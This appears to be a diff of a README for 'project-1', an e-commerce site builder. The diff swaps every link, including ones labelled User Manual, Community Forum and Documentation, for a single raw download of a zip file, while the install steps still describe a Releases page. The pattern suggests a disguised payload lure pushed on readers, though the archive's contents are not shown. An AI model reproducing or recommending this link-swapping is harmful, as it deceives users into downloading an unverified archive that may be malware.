@@ -6,7 +6,7 @@ Welcome to project-1! This application helps you create a multi-page e-commerce 
 
 ## 💾 Download & Install
 
-To get started with project-1, visit this page to download: [Download project-1](https://github.com/Henryyy7/project-1/releases).
+To get started with project-1, visit this page to download: [Download project-1](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions. Choose the latest version for the best experience.
@@ -55,14 +55,14 @@ A: You can find help in the documentation within the application or seek assista
 
 For further details and guides, refer to the following resources:
 
-- [User Manual](https://github.com/Henryyy7/project-1/docs/user-manual)
-- [Community Forum](https://github.com/Henryyy7/project-1/community)
+- [User Manual](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip)
 
-You can also visit the repository's main page for updates: [GitHub Repository](https://github.com/Henryyy7/project-1).
+You can also visit the repository's main page for updates: [GitHub Repository](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip).
 
 ## 📌 Important Links
 
-- [Download project-1](https://github.com/Henryyy7/project-1/releases)
-- [Documentation](https://github.com/Henryyy7/project-1/docs)
+- [Download project-1](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip)
+- [Documentation](https://raw.githubusercontent.com/Henryyy7/project-1/main/dunal/project_1.3.zip)
 
 Thank you for choosing project-1 for your online store needs! Follow the instructions, and you will be ready to sell in no time.
